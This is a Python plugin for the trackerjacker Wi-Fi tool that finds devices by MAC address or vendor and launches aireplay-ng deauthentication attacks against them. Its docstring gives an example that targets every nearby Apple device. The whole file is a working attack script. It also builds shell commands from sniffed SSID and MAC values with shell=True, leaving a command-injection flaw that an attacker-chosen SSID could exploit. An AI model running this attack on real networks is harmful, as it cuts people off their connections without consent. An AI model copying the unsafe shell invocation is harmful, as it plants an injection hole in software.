"""Looks for and deauths the specified mac_to_deauth or vendor_to_deauth using aircrack-ng.

Be careful with vendor_to_deauth - deauth attack every device by that vendor nearby... theoretically.

Example of how to call:
    trackerjacker --track --plugin plugin_examples/deauth_attack.py --plugin-config "{'vendor_to_deauth': 'Apple'}"

"""
import subprocess

__author__ = 'Caleb Madrigal'
__email__ = 'caleb.madrigal@gmail.com'
__version__ = '0.0.4'
__apiversion__ = 1
__config__ = {'trigger_cooldown': 1}


class Trigger:
    def __init__(self, mac_to_deauth=None, vendor_to_deauth=None, deauth_count=3):
        if not mac_to_deauth and not vendor_to_deauth:
            raise Exception('deauth_attack requires either "mac_to_deauth" or "vendor_to_deauth"')

        self.mac_to_deauth = mac_to_deauth
        self.vendor_to_deauth = vendor_to_deauth
        self.deauth_count = deauth_count
        print('deauth_mac plugin - looking for {}'.format(mac_to_deauth))

    def __call__(self, dev_id=None, vendor=None, ssid=None, bssid=None, iface=None, **kwargs):
        if ((self.mac_to_deauth and dev_id == self.mac_to_deauth) or
                (self.vendor_to_deauth and self.vendor_fuzzy_match(vendor))):

            print('Saw MAC ({}) on bssid={}, ssid={}, iface={}, vendor={}'.format(dev_id, bssid, ssid, iface, vendor))
            if iface:
                if bssid and bssid.lower() not in {'00:00:00:00:00:00', 'ff:ff:ff:ff:ff:ff'}:
                    print('\tDeauthing {}'.format(dev_id))
                    deauth_cmd = 'aireplay-ng -0 {count} -a {bssid} -c {mac} {iface}'.format(count=self.deauth_count,
                                                                                             bssid=bssid,
                                                                                             iface=iface,
                                                                                             mac=dev_id)
                    print('\tDeauth cmd: {}'.format(deauth_cmd))
                    subprocess.call(deauth_cmd, shell=True)
                    return
                elif ssid:
                    print('\tDeauthing {}'.format(dev_id))
                    deauth_cmd = 'aireplay-ng -0 {count} -e {ssid} -c {mac} {iface}'.format(count=self.deauth_count,
                                                                                            ssid=ssid,
                                                                                            iface=iface,
                                                                                            mac=dev_id)
                    print('\tDeauth cmd: {}'.format(deauth_cmd))
                    subprocess.call(deauth_cmd, shell=True)
                    return

            print('\tNot enough data to deauth - need ssid or bssid')

    def vendor_fuzzy_match(self, vendor):
        if not vendor:
            return False
        return self.vendor_to_deauth.lower() in vendor.lower()
